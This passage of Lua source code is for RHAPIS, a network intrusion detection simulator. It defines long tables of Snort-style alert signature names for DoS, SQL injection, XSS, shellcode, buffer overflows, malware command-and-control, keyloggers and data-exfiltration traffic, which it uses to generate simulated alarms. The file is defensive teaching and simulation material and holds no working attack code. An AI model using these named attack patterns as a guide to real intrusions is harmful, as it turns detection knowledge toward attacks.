 math.randomseed(os.time())
 -- yrh8yeqti92djldtsf41b34067eev9rlvai2ssztmg9z00bufla1ahefh1nhwyazy3h
print("RHAPIS - NIDS Simulator v0.97b (c) 2014 Fanis Siampos")
print("Type HELP on console to view the available commands\n")

function printLogo()
print("8888888b.  888    888        d8888 8888888b. 8888888 .d8888b.")
print("888   Y88b 888    888       d88888 888   Y88b  888  d88P  Y88b")
print("888    888 888    888      d88P888 888    888  888  Y88b.")
print("888   d88P 8888888888     d88P 888 888   d88P  888   Y888b.")
print("8888888P   888    888    d88P  888 8888888P    888      Y88b.")
print("888 T88b   888    888   d88P   888 888         888        888")
print("888  T88b  888    888  d8888888888 888         888  Y88b  d88P")
print("888   T88b 888    888 d88P     888 888       8888888 Y8888P")

end

printLogo()
local name

function rule_exists(name)
   local f=io.open("rules/" .. name .. ".rules","r")
   if f~=nil then io.close(f) return true else return false end
end
function eval_exists(name)
   local f=io.open("evaluations/" .. name .. ".data","r")
   if f~=nil then io.close(f) return true else return false end
end
function config1_exists(name)
   local f=io.open("configurations/" .. name .. ".config","r")
   if f~=nil then io.close(f) return true else return false end
end
function config2_exists(name)
   local f=io.open("configurations/" .. name .. ".conf","r")
   if f~=nil then io.close(f) return true else return false end
end

function isInteger(x)
return math.floor(x)==x
end

function delay_s(delay)
   delay = delay or 1
   local time_to = os.time() + delay
   while os.time() < time_to do end
end


local function convert(chars,dist,inv)
	local charInt = string.byte(chars);
	for i=1,dist do
		if(inv)then charInt = charInt - 1; else charInt = charInt + 1; end
		if(charInt<32)then
			if(inv)then charInt = 126; else charInt = 126; end
		elseif(charInt>126)then
			if(inv)then charInt = 32; else charInt = 32; end
		end
	end
	return string.char(charInt);
end
local dosxp = 0
local answer
local zdos=0
local zshell=0
local serizmix=0
local serizdc=0
local zxss=0
local transhost=0
local zarp=0
local zcsrf=0
local genmalxfact=0
local zsql=0
local zbuff=0
local anon=0
local anons={}
local zrfi=0
 arxalerts =math.random(14124124,94124124)

arxeioalarms = io.open("alarms/" .. arxalerts .. ".data", "w")

 arxintr =math.random(14124124,94124124)

arxeiointr = io.open("intruders/" .. arxintr .. ".data", "w")

 
local variablex
local i=1
 arxeio=math.random(0,2000055)
   arxeio2= 0000
local l=0
local paxname=0
local transdatax=0
local transdatab=0
local writedet=0
local probe=0
local z=0
local a=0
local b=0
local tz=0
local inc9=0
local xpath=0
local tb=0
local iodetect=0
local c=0
local digdi=0
local d=0
local transdata=0
local e=0
local f=0
local inc1=0
local inc2=0
local inc3=0
local inc4=0
local inc5=0
local inc6=0
local inc7=0
local inc8=0
local y=0
local psm=0
local pk=0
local ym=0
local yp=0
local trav=0
local m=0
local configs ={}
local data={}
local hij=0
local masq=0
local x=0
local gen=0
local geno=0
local alarms={}
local genmal=0
local answerx
local pob=0
local answerz
local password
classchoice = { 'normal', 'normal', 'normal', 'malicious' }
local dos = { 'DOS Active Directory Kerberos referral TGT renewal DoS attempt', 'DOS Windows Server2000/2003/2008 SMTP service DNS MX lookup denial of service attempt', 'DOS Microsoft ASP.NET viewstate DoS attempt','DOS Active Directory invalid OID denial of service attempt','DOS openldap server bind request denial of service attempt','DOS Oracle Internet Directory pre-auth ldap denial of service attempt','DOS IBM Tivoli Director LDAP server invalid DN message buffer overflow attempt','DOS generic web server hashing collision attack','DOS Microsoft SMS remote control client message length denial of service attempt'}
local dosfactor = { 'DDOS TFN Probe', 'DDOS tfn2k icmp possible communication', 'DDOS Trin00 Daemon to Master PONG message detected', 'DDOS TFN client command BE', 'DDOS shaft client login to handler', 'DDOS shaft handler to agent', 'DDOS shaft agent to handler', 'DDOS shaft synflood','DOS Single-Byte UDP Flood','DDOS Trin00 Daemon to Master message detected','DDOS Trin00 Daemon to Master *HELLO* message detected','DOS Teardrop attack','DOS UDP echo+chargen bomb','DOS WIN32 TCP print service denial of service attempt','PROTOCOL-FTP httpdx USER null byte denial of service','SERVER-MAIL SpamAssassin long message header denial of service attempt','SERVER-MAIL MailEnable SMTP HELO command denial of service attempt','SERVER-OTHER Macromedia Flash Media Server administration service denial of service attempt','DOS OpenSSL TLS connection record handling denial of service attempt','SERVER-MAIL Symantec Brightmail AntiSpam nested Zip handling denial of service attempt','SERVER-MYSQL Database unique set column denial of service attempt','OS-WINDOWS Microsoft Windows Active Directory crafted LDAP request denial of service attempt','DOS OpenSSL TLS connection record handling denial of service attempt','PROTOCOL-FTP httpdx USER null byte denial of service','DOS MIT Kerberos kdb_ldap plugin kinit operation denial of service attempt','DOS RealNetworks Helix Server RTSP SETUP request denial of service attempt','SERVER-ORACLE Database Intermedia Denial of Service Attempt','SERVER-ORACLE Oracle Web Cache denial of service attempt','PROTOCOL-VOIP Digium Asterisk IAX2 ack response denial of service attempt','SERVER-OTHER ISC BIND RRSIG query denial of service attempt','OS-WINDOWS Microsoft Windows Server driver crafted SMB data denial of service','OS-WINDOWS Microsoft Windows NAT Helper DNS query denial of service attempt','SERVER-OTHER IBM Tivoli kuddb2 denial of service attempt','DOS Cisco denial of service attempt','SERVER-MYSQL Database CASE NULL argument denial of service attempt','DOS ISC DHCP server 2 client_id length denial of service attempt','DOS ISC DHCP server 2 client_id length denial of service attempt','BROWSER-FIREFOX Multiple browser marquee tag denial of service attempt','SERVER-MYSQL Database unique set column denial of service attempt','DOS MIT Kerberos kdb_ldap plugin kinit operation denial of service attempt','DOS RealNetworks Audio Server denial of service attempt','SERVER-OTHER IBM Tivoli kuddb2 denial of service attempt','SERVER-ORACLE Database Intermedia Denial of Service Attempt','SERVER-OTHER CA ARCServe Backup Discovery Service denial of service attempt','DOS IBM solidDB SELECT statement denial of service attempt','SERVER-MYSQL Database CASE NULL argument denial of service attempt','SERVER-MAIL MailEnable SMTP HELO command denial of service attempt','SERVER-MAIL SpamAssassin long message header denial of service attempt','PROTOCOL-FTP httpdx PASS null byte denial of service','PROTOCOL-FTP httpdx USER null byte denial of service','SERVER-OTHER HP data protector OmniInet service NULL dereference denial of service attempt','DOS SolarWinds TFTP Server Read request denial of service attempt','SERVER-MYSQL IN NULL argument denial of service attempt','SERVER-APACHE Apache APR apr_fn match infinite loop denial of service attempt','SERVER-MAIL Symantec Brightmail AntiSpam nested Zip handling denial of service attempt','SERVER-WEBAPP Ipswitch WhatsUp Gold DOS Device HTTP request denial of service attempt','SERVER-ORACLE Oracle 9i TNS denial of service attempt','DOS RealNetworks Helix Server RTSP SETUP request denial of service attempt','OS-WINDOWS Microsoft Windows remote desktop denial of service attempt','PROTOCOL-FTP httpdx PASS null byte denial of service','SERVER-MYSQL Date_Format denial of service attempt','DOS MIT Kerberos kpasswd process_chpw_request denial of service attempt','DOS Kerberos KDC null pointer dereference denial of service attempt','DOS RealNetworks Helix Server RTSP SETUP request denial of service attempt','SERVER-OTHER Symantec Multiple Products ISAKMPd denial of service attempt','BROWSER-FIREFOX Multiple browser marquee tag denial of service attempt','DOS FreeRADIUS RADIUS server rad_decode remote denial of service attempt','SERVER-APACHE Apache APR apr_fn match infinite loop denial of service attempt','PROTOCOL-FTP httpdx PASS null byte denial of service','SERVER-OTHER EMC Dantz Retrospect Backup Agent denial of service attempt','SERVER-OTHER OpenLDAP ber_get_next BER decoding denial of service attempt','OS-WINDOWS Microsoft Windows NAT Helper DNS query denial of service attempt','PROTOCOL-FTP LIST globbing denial of service attack','DOS SAPLPD 0x53 command denial of service attempt','DOS ISC DHCP server zero length client ID denial of service attempt','DOS Quest NetVault SmartDisk libnvbasics.dll denial of service attempt','SERVER-WEBAPP Ipswitch WhatsUp Gold DOS Device HTTP request denial of service attempt','SERVER-ORACLE Oracle Web Cache denial of service attempt','SERVER-WEBAPP Compaq web-based management agent denial of service attempt','SERVER-OTHER Macromedia Flash Media Server administration service denial of service attempt','SERVER-IIS Microsoft Windows IIS malformed URL .dll denial of service attempt','SERVER-MYSQL Database CASE NULL argument denial of service attempt','SERVER-OTHER ISC BIND RRSIG query denial of service attempt','DOS IBM solidDB SELECT statement denial of service attempt','SERVER-OTHER EMC Dantz Retrospect Backup Agent denial of service attempt'}


local rfix = {'SERVER-WEBAPP TSEP remote file include in colorswitch.php tsep_config[absPath]','SERVER-WEBAPP Joomla Remote File Include upload attempt','SERVER-WEBAPP AnnoncesV remote file include in annonce.php page','SERVER-WEBAPP Boite de News remote file include in inc.php url_index','SERVER-WEBAPP WoW Roster remote file include with hslist.php and conf.php','SERVER-WEBAPP Sabdrimer remote file include in advanced1.php pluginpath[0]'} 

local traversal = {'SERVER-OTHER Computer Associates license PUTOLF directory traversal attempt','SCADA CODESYS Gateway-Server directory traversal attempt','SERVER-WEBAPP iChat directory traversal attempt','SERVER-ORACLE utl_file.fremove directory traversal attempt','PROTOCOL-FTP LIST directory traversal attempt','SERVER-OTHER rsync backup-dir directory traversal attempt','PROTOCOL-IMAP status directory traversal attempt','PROTOCOL-IMAP examine directory traversal attempt','PROTOCOL-IMAP rename directory traversal attempt','SERVER-ORACLE utl_file.fopen_nchar directory traversal attempt','SERVER-ORACLE utl_file.fopen directory traversal attempt','SERVER-OTHER rsync backup-dir directory traversal attempt','SERVER-WEBAPP iChat directory traversal attempt','PROTOCOL-IMAP delete directory traversal attempt','SERVER-OTHER rsync backup-dir directory traversal attempt','SERVER-WEBAPP OpenStack Compute directory traversal attempt','SERVER-WEBAPP Compaq Insight directory traversal','SERVER-WEBAPP TrackerCam ComGetLogFile.php3 directory traversal attempt','PROTOCOL-IMAP unsubscribe directory traversal attempt'} 

local sqlhit = {'SQL url ending in comment characters - possible sql injection attempt','INDICATOR-OBFUSCATION large number of calls to concat function - possible sql injection obfuscation','SERVER-ORACLE SYS.KUPW-WORKER sql injection attempt','SERVER-ORACLE Oracle Database Server DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE procedure SQL injection attempt','SERVER-ORACLE Oracle Database Server DBMS_CDC_PUBLISH.ALTER_CHANGE_SOURCE procedure SQL injection attempt','PROTOCOL-FTP ProFTPD username sql injection attempt','SQL 1 = 1 - possible sql injection attempt','SERVER-WEBAPP Wordcircle SQL injection attempt','SERVER-ORACLE Warehouse builder WE_OLAP_AW_SET_SOLVE_ID SQL Injection attempt','SQL url ending in comment characters - possible sql injection attempt','INDICATOR-OBFUSCATION large number of calls to char function - possible sql injection obfuscation','SCAN sqlmap SQL injection scan attempt','SERVER-ORACLE Warehouse builder WE_OLAP_AW_SET_SOLVE_ID SQL Injection attempt','SERVER-WEBAPP IBM Tivoli Provisioning Manager Express asset.getmimetype sql injection attempt','SERVER-ORACLE DBMS_EXPORT_EXTENSION SQL injection attempt','SQL char and sysobjects - possible sql injection recon attempt','SCAN sqlmap SQL injection scan attempt','SERVER-ORACLE DBMS_ASSERT.simple_sql_name double quote SQL injection attempt','SQL 1 = 0 - possible sql injection attempt','SQL Ruby on rails SQL injection attempt','SERVER-ORACLE SYS.KUPW-WORKER sql injection attempt','SERVER-ORACLE Oracle Database Server RollbackWorkspace SQL injection attempt','SERVER-ORACLE Oracle Database Server DBMS_CDC_PUBLISH.ALTER_CHANGE_SOURCE procedure SQL injection attempt'}

local sitescript = {'SERVER-WEBAPP Wordpress wp-banners-lite plugin cross site scripting attempt','INDICATOR-COMPROMISE successful cross site scripting forced download attempt','SERVER-WEBAPP phpinfo GET POST and COOKIE Parameters cross site scripting attempt','SERVER-WEBAPP Symantec Web Gateway timer.php cross site scripting attempt','OS-WINDOWS Microsoft Windows MMC createcab.cmd cross site scripting attempt','SERVER-ORACLE Glass Fish Server malformed username cross site scripting attempt','OS-WINDOWS Microsoft Anti-Cross Site Scripting library bypass attempt','OS-WINDOWS Microsoft Windows MMC mmc.exe cross site scripting attempt','SERVER-WEBAPP Microsoft Office SharePoint name field cross site scripting attempt','OS-WINDOWS Microsoft Windows MMC createcab.cmd cross site scripting attempt','SERVER-WEBAPP Wordpress wp-banners-lite plugin cross site scripting attempt','INDICATOR-COMPROMISE successful cross site scripting forced download attempt','OS-WINDOWS Microsoft Windows MMC mmcndmgr.dll cross site scripting attempt','OS-WINDOWS Microsoft Windows MMC createcab.cmd cross site scripting attempt','SERVER-WEBAPP Wordpress wp-banners-lite plugin cross site scripting attempt','SERVER-ORACLE Application Server BPEL module cross site scripting attempt','SERVER-OTHER IBM Lotus Notes Cross Site Scripting attempt','SERVER-MSSQL Microsoft SQL Server Reporting Services cross site scripting attempt','SERVER-WEBAPP phpinfo GET POST and COOKIE Parameters cross site scripting attempt','SERVER-MSSQL Microsoft SQL Server Reporting Services cross site scripting attempt','OS-WINDOWS Microsoft Windows MMC mmc.exe cross site scripting attempt'}

local shellzero = {'INDICATOR-SHELLCODE Metasploit meterpreter webcam_method request/response attempt','INDICATOR-SHELLCODE x86 inc ecx NOOP','INDICATOR-SHELLCODE x86 PoC CVE-2003-0605','INDICATOR-SHELLCODE x86 inc ecx NOOP','INDICATOR-SHELLCODE ssh CRC32 overflow filler','INDICATOR-SHELLCODE kadmind buffer overflow attempt','INDICATOR-SHELLCODE Metasploit meterpreter stdapi_sys_eventlog_method request/response attempt','INDICATOR-SHELLCODE x86 setuid 0','INDICATOR-SHELLCODE Metasploit meterpreter stdapi_registry_method request/response attempt','INDICATOR-SHELLCODE ssh CRC32 overflow NOOP','INDICATOR-SHELLCODE x86 win2k-2k3 decoder base shellcode','INDICATOR-SHELLCODE Metasploit meterpreter incognito_method request/response attempt','INDICATOR-SHELLCODE Possible generic javascript heap spray attempt'}

local overbuffer = {'NETBIOS SMB write_andx overflow attempt','SERVER-MAIL SEND overflow attempt','SERVER-OTHER Oracle Web Cache GET overflow attempt','SERVER-WEBAPP Delegate whois overflow attempt','OS-WINDOWS MS-SQL convert function unicode overflow','OS-WINDOWS Microsoft Windows vbscript/jscript scripting engine end buffer overflow attempt','SERVER-OTHER Oracle Web Cache TRACE overflow attempt','SCADA ScadaTec Procyon Core server password overflow attempt','SERVER-MAIL Sendmail SOML FROM prescan too many addresses overflow','SNMP community string buffer overflow attempt with evasion','SERVER-OTHER Bind Buffer Overflow named tsig overflow attempt','INDICATOR-SHELLCODE kadmind buffer overflow attempt','SERVER-WEBAPP CommuniGate Systems CommuniGate Pro LDAP Server buffer overflow attempt','SERVER-OTHER GoodTech SSH Server SFTP Processing Buffer Overflow','SERVER-OTHER HP OpenView CGI parameter buffer overflow attempt','FILE-IMAGE CUPS Gif Decoding Routine Buffer Overflow attempt','SERVER-ORACLE sys.dbms_repcat_fla.add_object_to_flavor buffer overflow attempt','SERVER-ORACLE sys.dbms_repcat_fla_mas.add_columns_to_flavor buffer overflow attempt','SERVER-ORACLE auth_sesskey buffer overflow attempt','SERVER-MAIL Multiple IMAP server CREATE command buffer overflow attempt','PROTOCOL-IMAP create buffer overflow attempt','SERVER-OTHER CA Brightstor discovery service alternate buffer overflow attempt','SERVER-ORACLE LINK metadata buffer overflow attempt','SERVER-MAIL IBM Lotus Notes DOC attachment viewer buffer overflow','SERVER-OTHER Samba spools RPC smb_io_notify_option_type_data request handling buffer overflow attempt','SERVER-OTHER IBM DB2 Universal Database receiveDASMessage buffer overflow attempt','SERVER-ORACLE dbms_offline_og.begin_flavor_change buffer overflow attempt','INDICATOR-SHELLCODE kadmind buffer overflow attempt','PUA-OTHER Trillian AIM XML tag handling heap buffer overflow attempt','OS-WINDOWS Microsoft Windows WebDAV pathname buffer overflow attempt','(smtp) Attempted command buffer overflow: more than 512 chars','(smtp) Attempted specific command buffer overflow: SEND, 256 chars','FILE-MULTIMEDIA VideoLAN VLC Media Player libdirectx_plugin.dll AMV parsing buffer overflow attempt','SERVER-OTHER AIM goaway message buffer overflow attempt','FILE-MULTIMEDIA Apple iTunes ITMS protocol handler stack buffer overflow attempt','OS-WINDOWS Microsoft Windows embedded web font handling buffer overflow attempt','BROWSER-IE Microsoft Internet Explorer isComponentInstalled function buffer overflow','BROWSER-FIREFOX Mozilla Firefox domain name handling buffer overflow attempt','BROWSER-PLUGINS Symantec Backup Exec ActiveX control buffer overflow attempt','OS-WINDOWS Microsoft Jet DB Engine Buffer Overflow attempt','SERVER-APACHE Apache mod_rewrite buffer overflow attempt','BROWSER-PLUGINS RKD Software BarCode ActiveX buffer overflow attempt','OS-WINDOWS Microsoft Windows embedded OpenType font engine LZX decompression buffer overflow attempt','SERVER-ORACLE ftp TEST command buffer overflow attempt','SERVER-OTHER Bind Buffer Overflow via NXT records','SERVER-OTHER Bind Buffer Overflow named tsig overflow attempt','SERVER-OTHER Wireshark LWRES Dissector getaddrsbyname buffer overflow attempt','SERVER-OTHER HP Openview Network Node Manager OValarmsrv buffer overflow attempt','SQL formatmessage possible buffer overflow','SERVER-ORACLE dbms_offline_og.end_flavor_change buffer overflow attempt','SERVER-MAIL IBM Lotus Notes WPD attachment handling buffer overflow','SERVER-WEBAPP Subversion 1.0.2 dated-rev-report buffer overflow attempt','SERVER-MSSQL raiserror possible buffer overflow','SERVER-WEBAPP Borland StarTeam Multicast Service buffer overflow attempt','SERVER-OTHER GoodTech SSH Server SFTP Processing Buffer Overflow','SERVER-OTHER CA ARCserve LGServer handshake buffer overflow attempt','SERVER-OTHER Avaya WinPDM Unite host router buffer overflow attempt','PROTOCOL-VOIP Avaya WinPDM header buffer overflow attempt','SERVER-ORACLE sys.dbms_repcat_fla_mas.obsolete_flavor_definition buffer overflow attempt','SERVER-MAIL Netmanager chameleon SMTPd buffer overflow attempt','SERVER-OTHER Citrix Program Neighborhood Client buffer overflow attempt','SERVER-MAIL Novell GroupWise Internet Agent Email address processing buffer overflow attempt','SNMP community string buffer overflow attempt with evasion','SERVER-OTHER ActFax LPD Server data field buffer overflow attempt','BROWSER-PLUGINS iseemedia LPViewer ActiveX buffer overflows attempt','BROWSER-PLUGINS Liquid XML Studio LtXmlComHelp8.dll ActiveX OpenFile buffer overflow attempt','(smtp) Attempted specific command buffer overflow: VRFY, 264 chars','(smtp) Attempted specific command buffer overflow: HELP, 510 chars','BROWSER-IE Microsoft Internet Explorer VML buffer overflow attempt','BROWSER-OTHER Opera file URI handling buffer overflow'}

local bruteg = {'SCAN DirBuster brute forcing tool detected','ET SCAN Potential FTP Brute-Force attempt','SQL SA brute force login attempt'}

local malbiz = {'MALWARE-BACKDOOR black curse 4.0 runtime detection - inverse init connection','MALWARE-OTHER mimail.s smtp propagation detection','MALWARE-OTHER Win.Trojan.Agent variant outbound connection','MALWARE-OTHER Keylogger apophis spy 1.0 runtime detection','MALWARE-OTHER HTTP POST request to a GIF file','MALWARE-TOOLS Hacker-Tool mini oblivion runtime detection - successful init connection','MALWARE-BACKDOOR chupacabra 1.0 runtime detection - send messages','MALWARE-BACKDOOR silent spy 2.10 command response port 4226','MALWARE-OTHER Keylogger easy Keylogger runtime detection','MALWARE-BACKDOOR minicom lite runtime detection - udp','MALWARE-BACKDOOR acidbattery 1.0 runtime detection - get server info','MALWARE-BACKDOOR Trojan.Midwgif.A runtime detection','MALWARE-BACKDOOR Win.Backdoor.PCRat data upload','MALWARE-BACKDOOR Win.Backdoor.Dulevco.A runtime detection','MALWARE-BACKDOOR Win.Backdoor.Dulevco.A runtime detection','MALWARE-BACKDOOR Jokra dropper download','MALWARE-BACKDOOR Windows vernot download','MALWARE-BACKDOOR DarkSeoul related wiper','MALWARE-BACKDOOR ANDR-WIN.MSIL variant PC-USB Malicious executable file download','MALWARE-BACKDOOR possible Htran setup command - tran','MALWARE-BACKDOOR possible Htran setup command - slave','MALWARE-BACKDOOR possible Htran setup command - listen','MALWARE-BACKDOOR Htran banner','MALWARE-BACKDOOR possible Htran setup command - tran','MALWARE-BACKDOOR possible Htran setup command - slave','MALWARE-BACKDOOR possible Htran setup command - listen','MALWARE-BACKDOOR UnrealIRCd backdoor command execution attempt','MALWARE-BACKDOOR Arucer backdoor traffic - NOP command attempt','MALWARE-BACKDOOR am remote client runtime detection - client response','MALWARE-BACKDOOR Win.Trojan.Spy.Heur outbound connection attempt','MALWARE-BACKDOOR Win.Trojan.Ransomlock runtime detection','MALWARE-BACKDOOR Trojan.KDV.QLO runtime detection','MALWARE-BACKDOOR Trojan.KDV.QLO runtime detection','MALWARE-BACKDOOR Trojan.KDV.QLO install time detection','MALWARE-BACKDOOR Backdoor.Win32.Protos.A runtime detection','MALWARE-BACKDOOR Trojan.FakeAV.FakeAlert runtime detection','MALWARE-BACKDOOR Trojan.Delf.KDV runtime detection','MALWARE-BACKDOOR Trojan-Downloader.Win32.Doneltart.A runtime detection','MALWARE-CNC Backdoor.Win32.Wolyx.A runtime detection','MALWARE-CNC Win.Trojan.Datash variant outbound connection','MALWARE-CNC Win.Trojan.Datash variant outbound connection','MALWARE-CNC Win.Downloader.Zawat variant outbound connection','MALWARE-CNC OSX.Trojan.KitM outbound connection','MALWARE-CNC OSX.Trojan.KitM outbound connection user-agent','MALWARE-CNC Trojan.Dapato CMS spambot check-in','MALWARE-CNC XP Fake Antivirus Check-in"; flow:to_server,established','MALWARE-CNC XP Fake Antivirus Payment Page Request','MALWARE-CNC Win.Trojan.Syndicasec Stage Two traffic','MALWARE-CNC Win.Backdoor.Tomvode variant outbound connection','MALWARE-CNC Win.Trojan.Vbula variant initial CNC contact','MALWARE-CNC Win.Trojan.Vbula variant outbound connection','MALWARE-CNC Win.Trojan.Qrmon variant outbound connection','MALWARE-CNC Win.Trojan.Nivdort variant outbound connection','MALWARE-CNC cridex HTTP Response - default0.js','MALWARE-CNC cridex encrypted POST check-in','MALWARE-CNC Win.Trojan.Kazy variant outbound connection','MALWARE-CNC Win.Trojan.Blocker outbound connection POST','MALWARE-CNC Win.Trojan.Blocker outbound connection HTTP Header Structure','MALWARE-CNC Win.Worm.Luder outbound connection','MALWARE-CNC Win.Spy.Banker variant outbound connection','MALWARE-CNC Win.Spy.Banker variant outbound connection','MALWARE-CNC Android Fakedoc device information leakage','MALWARE-CNC Win.Trojan.Bancos variant outbound connection','MALWARE-CNC Potential Bancos Trojan - HTTP Header Structure Anomaly v2.0','MALWARE-CNC Android Fakeinst device information leakage','MALWARE-CNC Android Fakeinst device information leakage','MALWARE-CNC Win.Trojan.Elefin variant outbound connection','MALWARE-CNC Win.Dropper.Datcaen variant outbound connection','MALWARE-CNC Win.Dropper.Datcaen variant outbound connection','MALWARE-CNC Harbinger rootkit click fraud HTTP response','MALWARE-CNC Win.Trojan.BlackRev cnc full command','MALWARE-CNC Win.Trojan.BlackRev cnc allhttp command','MALWARE-TOOLS Dirt Jumper toolkit variant http flood attempt','MALWARE-OTHER DNS information disclosure attempt','MALWARE-OTHER WIN.Worm.Beagle.AZ SMTP propagation detection','MALWARE-OTHER ANDR.Trojan.ZertSecurity encrypted information leak','MALWARE-OTHER ANDR.Trojan.ZertSecurity apk download','MALWARE-OTHER ANDR.Trojan.Opfake APK file download','MALWARE-OTHER Win.Trojan.Kazy download attempt','MALWARE-OTHER Compromised Website response - leads to Exploit Kit','MALWARE-OTHER OSX.Trojan.KitM file download','MALWARE-OTHER OSX.Trojan.KitM file download','MALWARE-OTHER Fake delivery information phishing attack','MALWARE-OTHER Unix.Backdoor.Cdorked download attempt','ALWARE-OTHER Unix.Backdoor.Cdorked download attempt','MALWARE-OTHER Win.Trojan.Zeus Spam 2013 dated zip/exe HTTP Response - potential malware download','MALWARE-OTHER Win.Worm.Dorkbot Desktop.ini snkb0ptz.exe creation attempt SMB','MALWARE-OTHER Win.Worm.Dorkbot executable snkb0ptz.exe creation attempt SMB','MALWARE-OTHER Win.Worm.Dorkbot folder snkb0ptz creation attempt SMB','MALWARE-OTHER Possible data upload - Bitcoin Miner User Agent','MALWARE-OTHER UTF-8 BOM in zip file attachment detected','MALWARE-OTHER UTF-8 BOM in zip file attachment detected','MALWARE-OTHER UTF-8 BOM in zip file attachment detected','MALWARE-OTHER Double HTTP Server declared','MALWARE-OTHER ANDR.Trojan.Chuli APK file download','MALWARE-OTHER ANDR.Trojan.Chuli APK file download','MALWARE-OTHER Fake postal receipt HTTP Response phishing attack','MALWARE-OTHER ANDR.Trojan.PremiumSMS APK file download','MALWARE-OTHER ANDR.Trojan.PremiumSMS APK file download','MALWARE-OTHER Compromised website response - leads to Exploit Kit'}

local probecall = {'SCAN Webtrends Scanner UDP Probe','SERVER-OTHER Arkeia client backup generic info probe','SCAN L3retriever HTTP Probe','PUA-P2P Ruckus P2P broadcast domain probe'}
dosrand= dosfactor[ math.random( #dosfactor ) ]
dosrand2= dosfactor[ math.random( #dosfactor ) ] 

dosrand3= dosfactor[ math.random( #dosfactor ) ] 

dosrand4= dosfactor[ math.random( #dosfactor ) ] 

dosrand5= dosfactor[ math.random( #dosfactor ) ] 
 
uinxc16 = math.random(0,100000) 
uinxc17 = math.random(0,1000) 
local message = { 'delivered', 'not delivered', 'delivered', 'delivered', 'delivered', 'delivered'}
local myTable = { 'tcp', 'udp', 'icmp'}
local myTablex = { '-', '|', '#', 'a', 'b', 'd', '$', '^', '*', '~', '(', ')', 'g', 'h', 'e', 'f', 'h', 'i', 'j', ':', ';', '&', ']', '[', '@', 's', '%', '!', '{', '}', '+', '_', '?', '.', ',', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u','v','e','w','x','y','z','±','§','1','2','3','4','5','6','7','8','9','0'}
local header = { 'a', 'b', 'd', 'g', 'h', 'e', 'f', 'h', 'i', 'j', 's','k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u','v','e','w','x','y','z','1','2','3','4','5','6','7','8','9','0'}
local decheader = { 'A', 'B', 'C', 'D', 'E', 'F', '1','2','3','4','5','6','7','8','9','0'}
local myTablex3 = { 'Athens','Munich','Rome','Beijing','Madrid','New York','Latvia','Ukraine','Somalia','Cambodia','Tokyo','Melbourne','Denmark','Alaska','Shanghai','Istanbul','Karachi','Mumbai','Moscow','Beijing','São Paulo','Tianjin','Guangzhou','Delhi','Seoul','Shenzhen','Jakarta','Mexico City','Kinshasa','Bengaluru','Tehran','Dongguan','London','Lagos','Lima','Cambodia','Bogotá','Hong Kong','Bangkok','Dhaka','Hyderabad','Cairo','Hanoi','Wuhan','Rio de Janeiro','Lahore','Ahmedabad','Baghdad','Riyadh','Singapore','Saint Petersburg','Santiago','Chennai','Ankara','Chongqing','Kolkata','Surat','Yangon','Alexandria','Shenyang','Suzhou','New Taipei City','Johannesburg','Los Angeles','Yokohama','Abidjan','Busan','Berlin','Cape Town','Durban','Jeddah','Pyongyang','Nairobi','Pune','Jaipur','Addis Ababa','Casablanca'}
local ddd=0
local fff=0
local ooo=0
local kkk=0
local ttt=0
local bnm=0
local jk=0
local looper=1
local numberj = math.random(0,25)
local numberdata = {0}
local attempts = { 'Successful', 'Unsuccessful'}
local answerx
local answerz
local countz = 0
local password
local myTableZERO = { '-', '*', '-', '-'}

local myTablec = { 'tcp', 'udp','icmp'}
local myTabled = {'aol', 'auth', 'bgp', 'courier', 'csnet_ns', 'ctf', 'daytime', 'discard', 'domain', 'domain_u', 'echo', 'eco_i', 'ecr_i', 'efs', 'exec', 'finger', 'ftp', 'ftp_data', 'gopher', 'harvest', 'hostnames', 'http', 'http_2784', 'http_443', 'http_8001', 'imap4', 'IRC', 'iso_tsap', 'klogin', 'kshell', 'ldap', 'link', 'login', 'mtp', 'name', 'netbios_dgm', 'netbios_ns', 'netbios_ssn', 'netstat', 'nnsp', 'nntp', 'ntp_u', 'other', 'pm_dump', 'pop_2', 'pop_3', 'printer', 'private', 'red_i', 'remote_job', 'rje', 'shell', 'smtp', 'sql_net', 'ssh', 'sunrpc', 'supdup', 'systat', 'telnet', 'tftp_u', 'tim_i', 'time', 'urh_i', 'urp_i', 'uucp', 'uucp_path', 'vmnet', 'whois', 'X11', 'Z39_50'} 
local myTablee = { 'OTH', 'REJ', 'RSTO', 'RSTOS0', 'RSTR', 'S0', 'S1', 'S2', 'S3', 'SF', 'SH' }
local myTable2 = { 'http', 'ftp' , 'smtp'}
local myTable3 = { 'vpn', 'isdn' , 'adsl' , 'dial-up'}
local myTable4 = { 'GET', 'POST'}
local myTablecc = { 'tcp', 'udp', 'icmp'}
local myTablec2 = { '$HOME_NET', '$EXTERNAL_NET'}
local myTablec5 = { '$HOME_NET', '$EXTERNAL_NET' , '$SQL_SERVERS', '$ORACLE_PORTS' , '$HTTP_SERVERS' , '$HTTP_PORTS' , '$SMTP_SERVERS 25' , '$FILE_DATA_PORTS'}

local myTablec3 = { 'MALWARE-BACKDOOR - Dagger_1.4.0', 'PROTOCOL-ICMP Mobile Registration Reply' , 'INDICATOR-SHELLCODE Oracle sparc setuid 0' , 'INDICATOR-SHELLCODE sparc NOOP' , 'SERVER-MAIL Sendmail 5.5.5 exploit', 'SERVER-OTHER Adobe Coldfusion db connections flush attempt' , 'SERVER-IIS bdir access' , 'SERVER-WEBAPP carbo.dll access' , 'SERVER-IIS cmd.exe access' , 'SERVER-ORACLE EXECUTE_SYSTEM attempt' , 'SERVER-OTHER LPD dvips remote command execution attempt' , 'OS-WINDOWS DCERPC Messenger Service buffer overflow attempt' , 'PROTOCOL-RPC sadmind query with root credentials attempt UDP' , 'OS-WINDOWS SMB-DS DCERPC Messenger Service buffer overflow attempt' , 'SERVER-MAIL VRFY overflow attempt' , 'SERVER-WEBAPP PhpGedView PGV functions.php base directory manipulation attempt' , 'MALWARE-CNC DoomJuice/mydoom.a backdoor upload/execute' , 'SERVER-OTHER ISAKMP first payload certificate request length overflow attempt' , 'NETBIOS NS lookup short response attempt' , 'FILE-IMAGE JPEG parser multipacket heap overflow' , 'SERVER-ORACLE dbms_offline_og.end_instantiation buffer overflow attempt' , 'APP-DETECT Absolute Software Computrace outbound connection' , 'MALWARE-CNC Daws Trojan Outbound Plaintext over SSL Port' , 'BLACKLIST DNS request for known malware domain' , 'EXPLOIT-KIT Nuclear exploit kit Spoofed Host Header .com- requests' , 'EXPLOIT-KIT DotCachef/DotCache exploit kit 